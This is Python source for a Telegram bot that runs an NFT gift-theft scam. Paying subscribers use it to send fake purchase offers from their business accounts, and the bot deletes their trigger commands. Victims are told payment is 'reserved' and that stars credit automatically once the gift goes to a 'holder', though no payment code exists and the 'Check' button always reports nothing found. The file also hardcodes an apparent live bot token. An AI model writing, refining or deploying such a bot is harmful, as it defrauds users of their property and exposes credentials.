"""
Sulumi Team Bot — Full Stable DB + Tariffs + Auto-Delete
"""

import os
import re
import uuid
import time
import sqlite3
import requests
from collections import deque
from flask import Flask, request, jsonify

app = Flask(__name__)

# ==================== КОНФИГ ====================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "9021246143:AAF0SsyX81BAHC-myqxc2vN00JcFPGpgKhk")
OWNER_ID = int(os.environ.get("OWNER_ID", "7092015279"))
PAYMENT = os.environ.get("PAYMENT", "golda11123")
API = f"https://api.telegram.org/bot{BOT_TOKEN}"
RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://sulumi-bot.onrender.com")

# ==================== CUSTOM EMOJI ID ====================
E = {
    "stars": "5958376256788502078",
    "grams": "6006074913742396956",
    "decline": "5778527486270770928",
    "accept": "5776375003280838798",
    "forward": "5832251986635920010",
    "check": "6019523512908124649"
}

# ==================== PREMIUM EMOJI HELPERS ====================
def ce(name, fallback):
    return f'<tg-emoji emoji-id="{E[name]}">{fallback}</tg-emoji>'

def btn(text, data, emoji):
    return {"text": text, "callback_data": data, "icon_custom_emoji_id": E[emoji]}

def btn_url(text, url, emoji):
    return {"text": text, "url": url, "icon_custom_emoji_id": E[emoji]}

# ==================== БАЗА ДАННЫХ (SQLite) ====================
DB_PATH = "sulumi_subscribers.db"
INITIAL_SUBS = [869789263, -9065970214, -6421577466, -8350337709, -948464755, -9157210232]

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS subscribers (
                 user_id INTEGER PRIMARY KEY,
                 expires_at REAL)''')
    
    c.execute('INSERT OR IGNORE INTO subscribers (user_id, expires_at) VALUES (?, ?)', (OWNER_ID, -1.0))
    for uid in INITIAL_SUBS:
        c.execute('INSERT OR IGNORE INTO subscribers (user_id, expires_at) VALUES (?, ?)', (uid, -1.0))
    conn.commit()
    conn.close()

def is_allowed(uid):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT expires_at FROM subscribers WHERE user_id = ?', (uid,))
    row = c.fetchone()
    conn.close()
    if not row:
        return False
    if row[0] == -1.0:
        return True
    return row[0] > time.time()

def add_subscription(uid, days):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    expires = -1.0 if days == -1 else time.time() + (days * 86400)
    c.execute('INSERT OR REPLACE INTO subscribers (user_id, expires_at) VALUES (?, ?)', (uid, expires))
    conn.commit()
    conn.close()

def get_expires_str(uid):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT expires_at FROM subscribers WHERE user_id = ?', (uid,))
    row = c.fetchone()
    conn.close()
    if not row or row[0] == -1.0:
        return "Навсегда"
    return time.strftime("%d.%m.%Y %H:%M", time.localtime(row[0]))

init_db()

# ==================== ХРАНИЛИЩА ====================
deals = {}
users = {}
bconns = {}
wholder = set()
rlog = deque()
rwait = 0

ALLOWED_UPDATES = ["message", "callback_query", "business_connection", "business_message"]

# ==================== API ====================
def api(method, **p):
    global rwait
    now = time.time()
    if rwait > 0:
        time.sleep(rwait)
        rwait = 0
        rlog.clear()
    while rlog and rlog[0] < now - 1:
        rlog.popleft()
    if len(rlog) >= 25:
        time.sleep(1.0 - (now - rlog[0]))
    rlog.append(time.time())
    try:
        r = requests.post(API + "/" + method, json=p, timeout=60)
        d = r.json()
        if not d.get("ok") and d.get("error_code") == 429:
            rwait = d.get("parameters", {}).get("retry_after", 5)
            return api(method, **p)
        return d
    except Exception as e:
        print("ERR:", e)
        return {}

def fmt(n):
    return f"{int(n):,}".replace(",", " ")

def gs(uid):
    if uid not in users:
        users[uid] = {"lang": "ru", "cur": "stars", "hold": PAYMENT}
    return users[uid]

def sm(cid, txt, kb=None, bci=None):
    d = {"chat_id": cid, "text": txt, "parse_mode": "HTML"}
    if kb: d["reply_markup"] = kb
    if bci: d["business_connection_id"] = bci
    return api("sendMessage", **d)

def sm_nft(cid, txt, nft_url, kb=None, bci=None):
    d = {
        "chat_id": cid, "text": txt, "parse_mode": "HTML",
        "link_preview_options": {"is_disabled": False, "show_above_text": True, "url": nft_url}
    }
    if kb: d["reply_markup"] = kb
    if bci: d["business_connection_id"] = bci
    return api("sendMessage", **d)

def em_nft(cid, mid, txt, nft_url, kb=None, bci=None):
    d = {
        "chat_id": cid, "message_id": mid, "text": txt, "parse_mode": "HTML",
        "link_preview_options": {"is_disabled": False, "show_above_text": True, "url": nft_url}
    }
    if kb: d["reply_markup"] = kb
    if bci: d["business_connection_id"] = bci
    return api("editMessageText", **d)

def dm(cid, mid, bci=None):
    d = {"chat_id": cid, "message_id": mid}
    if bci: d["business_connection_id"] = bci
    return api("deleteMessage", **d)

def ac(cb, txt=None, sa=False):
    d = {"callback_query_id": cb, "show_alert": sa}
    if txt: d["text"] = txt
    return api("answerCallbackQuery", **d)

# ==================== КЛАВИАТУРЫ ====================
def okb(did):
    return {"inline_keyboard": [[btn(" Отклонить", f"decline:{did}", "decline"), btn(" Принять", f"accept:{did}", "accept")]]}

def aakb(did, h):
    clean_h = str(h).replace("@", "").strip()
    return {"inline_keyboard": [[btn_url(" Передать", f"tg://send_gift?to={clean_h}", "forward")], [btn(" Проверить", f"check:{did}", "check")]]}

def amenu():
    return {"inline_keyboard": [[{"text": "📋 Список доступов", "callback_data": "admin_list"}]]}

# ==================== ПАРСЕР ====================
def pnft(t):
    m = re.search(r'(?:https?://)?(?:t\.me/nft/)?([A-Za-z0-9]+-\d+)', t, re.I)
    if not m: return None
    s = m.group(1)
    np2, num = s.rsplit("-", 1)
    gn = re.sub(r'([a-z])([A-Z])', r'\1 \2', np2)
    return {"slug": s, "name": gn, "num": num, "nfmt": fmt(num)}

# ==================== ОБРАБОТЧИКИ ====================
def handle_message(msg):
    cid = msg["chat"]["id"]
    uid = msg["from"]["id"]
    mid = msg.get("message_id")
    ci = msg.get("business_connection_id")

    if ci:
        bconns[uid] = ci

    txt = (msg.get("text") or "").strip()

    # 1. Смена держателя
    if uid in wholder:
        un = txt.lstrip("@").lower()
        if un and " " not in un:
            gs(uid)["hold"] = un
            wholder.discard(uid)
            sm(cid, f"✅ Держатель изменён на @{un}", bci=ci)
        else:
            sm(cid, "❌ Неверный формат. Напишите username без @", bci=ci)
        return

    # 2. ИГНОРИРОВАНИЕ обычных сообщений (бот молчит)
    if not txt.startswith("/"): 
        return

    # 3. Проверка доступа через БД
    if not is_allowed(uid) and uid != OWNER_ID:
        sm(cid, f"🔒 <b>Доступ закрыт</b>\n\n💰 <b>Купите тариф у @{PAYMENT}</b>\n/тарифы — узнать цены", bci=ci)
        return

    if txt == "/start":
        cmd_text = f"""✨ <b>Sulumi Team Bot</b>

📋 <b>Как купить:</b>
1. Зайди в ЛС к продавцу
2. Напиши: <code>/send ссылка цена</code>

📋 <b>Команды:</b>
/тарифы — Цены на доступ
/settings — Настройки
/profile — Профиль"""
        if uid == OWNER_ID:
            cmd_text += "\n\n🔐 <b>Админ:</b>\n/add <id> <дни> (-1 навсегда)\n/list — Список"
        sm(cid, cmd_text, bci=ci)
        return

    if txt == "/тарифы" or txt == "/tariffs":
        sm(cid, f"""💎 <b>Тарифы Sulumi Team</b>

🥉 <b>1 День</b> — 1 TON
🥈 <b>3 Дня</b> — 2.5 TON
🥇 <b>Навсегда</b> — 4.5 TON

💳 <b>Для оплаты:</b>
Отправьте TON на кошелек и напишите @{PAYMENT} с чеком.""", bci=ci)
        return

    if txt.startswith("/send"):
        parts = txt.split()
        if len(parts) < 3:
            sm(cid, "❌ <b>Формат:</b>\n<code>/send ссылка цена</code>", bci=ci)
            return

        ni = pnft(" ".join(parts[1:]))
        if not ni:
            sm(cid, "❌ Не найдена ссылка на NFT", bci=ci)
            return

        rest = " ".join(parts[1:]).replace("https://t.me/nft/" + ni["slug"], "").replace("t.me/nft/" + ni["slug"], "").strip()
        ps = rest.split()
        pr = None
        if ps:
            try: pr = int(ps[0])
            except: pass

        if pr is None:
            sm(cid, "❌ Не указана цена", bci=ci)
            return

        s = gs(uid)
        cs = ce("stars", "⭐") if s["cur"] == "stars" else ce("grams", "💎")
        did = str(uuid.uuid4())[:8]
        
        sender_bci = ci or bconns.get(uid)
        if not sender_bci:
            sm(cid, "⚠️ <b>Подключи бизнес-аккаунт!</b>\n@BotFather → Business → Connect", bci=ci)
            return

        deals[did] = {"wid": uid, "lid": cid, "slug": ni["slug"], "name": ni["name"], "num": ni["num"], "price": pr, "cur": s["cur"], "hold": s["hold"], "st": "pending", "bci": sender_bci}

        nl = "https://t.me/nft/" + ni["slug"]
        hidden = '<a href="' + nl + '">\u200b</a>'
        sender_name = msg['from'].get('first_name') or msg['from'].get('username') or "Пользователь"
        caption = hidden + f"<b>{sender_name}</b> предлагает <b>{pr}</b> {cs} за ваш подарок <b>{ni['name']} #{ni['nfmt']}</b>.\n\nУ вас есть <b>5h 59m</b>, чтобы принять решение."

        # ШАГ 1: Отправляем оффер
        result = sm_nft(cid, caption, nl, kb=okb(did), bci=sender_bci)
        
        if result.get("ok"):
            # ШАГ 2: ТРИГГЕР НА УДАЛЕНИЕ команды
            if mid and ci:
                dm(cid, mid, bci=ci)
        else:
            err = result.get("description", "err").lower()
            if "business_peer_usage_missing" in err:
                sm(cid, "❌ Ошибка: бот не может писать в этот чат.", bci=ci)
            else:
                sm(cid, f"❌ Ошибка: {result.get('description', 'err')}", bci=ci)
        return

    if txt == "/settings":
        s = gs(uid)
        lt = "🇷🇺 Русский" if s["lang"] == "ru" else "🇬🇧 English"
        ct = f"{ce('stars', '⭐')} Звёзды" if s["cur"] == "stars" else f"{ce('grams', '💎')} Грамы"
        sm(cid, f"""⚙️ <b>Настройки</b>\n\n🌐 Язык: {lt}\n💱 Валюта: {ct}\n👑 Держатель: @{s['hold']}\n\n/holder <username> — сменить""", bci=ci)
        return

    if txt == "/profile":
        s = gs(uid)
        cur_emoji = ce('stars', '⭐') if s['cur'] == 'stars' else ce('grams', '💎')
        sm(cid, f"""👤 <b>Профиль</b>\n\n🆔 ID: <code>{uid}</code>\n💱 Валюта: {cur_emoji}\n👑 Держатель: @{s['hold']}\n⏳ Доступ до: <b>{get_expires_str(uid)}</b>""", bci=ci)
        return

    if txt.startswith("/add") and uid == OWNER_ID:
        parts = txt.split()
        if len(parts) >= 3:
            try:
                target_uid = int(parts[1])
                days = int(parts[2])
                add_subscription(target_uid, days)
                sm(cid, f"✅ Доступ выдан: {target_uid} на {days} дн.", bci=ci)
            except:
                sm(cid, "❌ Формат: /add <user_id> <дни>", bci=ci)
        return

    if txt == "/list" and uid == OWNER_ID:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('SELECT user_id, expires_at FROM subscribers')
        rows = c.fetchall()
        conn.close()
        ul = "\n".join([f"• <code>{r[0]}</code> (до: {get_expires_str(r[0])})" for r in rows])
        sm(cid, f"📋 <b>Доступы</b>:\n\n{ul}", amenu(), bci=ci)
        return

    if txt.startswith("/holder"):
        wholder.add(uid)
        sm(cid, "👑 Напишите username держателя БЕЗ @", bci=ci)
        return

def handle_callback(cb):
    cbid = cb["id"]
    uid = cb["from"]["id"]
    msg = cb.get("message") or {}
    cid = msg.get("chat", {}).get("id", uid)
    mid = msg.get("message_id", 0)
    data = cb.get("data", "")
    ci = msg.get("business_connection_id")

    if data.startswith("check:"):
        ac(cbid, txt="🔍 Подарок пока не найден.", sa=True)
        return
    ac(cbid)

    if data.startswith("accept:"):
        did = data.split(":")[1]
        deal = deals.get(did)
        if not deal or deal["st"] != "pending": return
        deal["st"] = "accepted"
        cs = ce("stars", "⭐") if deal["cur"] == "stars" else ce("grams", "💎")
        nf = fmt(deal["num"])
        h = deal["hold"]
        nl = "https://t.me/nft/" + deal["slug"]
        deal_ci = deal.get("bci") or ci

        hidden = '<a href="' + nl + '">\u200b</a>'
        txt = hidden + f"<b>{deal['price']}</b> {cs} успешно зарезервированы.\n\nОжидается передача <b>{deal['name']} #{nf}</b> пользователю @{h}.\n\nНажмите «Передать» и отправьте подарок. {cs} начислятся автоматически."
        
        result = em_nft(cid, mid, txt, nl, kb=aakb(did, h), bci=deal_ci)
        if not result.get("ok"):
            dm(cid, mid, bci=deal_ci)
            sm_nft(cid, txt, nl, kb=aakb(did, h), bci=deal_ci)
        return

    if data.startswith("decline:"):
        did = data.split(":")[1]
        deal = deals.get(did)
        deal_ci = deal.get("bci") or ci if deal else ci
        if deal: deal["st"] = "declined"
        em(cid, mid, "❌ Оффер отклонён.", bci=deal_ci)
        return

    if uid == OWNER_ID and data == "admin_list":
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('SELECT user_id FROM subscribers')
        ul = "\n".join([f"• <code>{r[0]}</code>" for r in c.fetchall()])
        conn.close()
        sm(cid, f"📋 Список:\n{ul}", amenu(), bci=ci)
        return

# ==================== WEBHOOK ====================
@app.route("/webhook", methods=["POST"])
def webhook():
    update = request.json
    try:
        if "message" in update: handle_message(update["message"])
        elif "callback_query" in update: handle_callback(update["callback_query"])
        elif "business_message" in update: handle_message(update["business_message"])
        elif "business_connection" in update:
            bc = update["business_connection"]
            bconns[bc["user"]["id"]] = bc["id"]
    except Exception as e:
        print("Webhook error:", e)
    return jsonify({"ok": True})

@app.route("/")
def index():
    return "✅ Sulumi Team Bot is running"

def set_webhook():
    url = f"{RENDER_URL}/webhook"
    result = api("setWebhook", url=url, allowed_updates=ALLOWED_UPDATES)
    print(f"Webhook set: {result.get('ok')}")

def set_commands():
    commands = [
        {"command": "start", "description": "📋 Меню"},
        {"command": "send", "description": "💎 Создать оффер"},
        {"command": "тарифы", "description": "💳 Цены на доступ"},
        {"command": "profile", "description": "👤 Профиль"},
        {"command": "settings", "description": "⚙️ Настройки"}
    ]
    api("setMyCommands", commands=commands)

if __name__ == "__main__":
    set_webhook()
    set_commands()
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
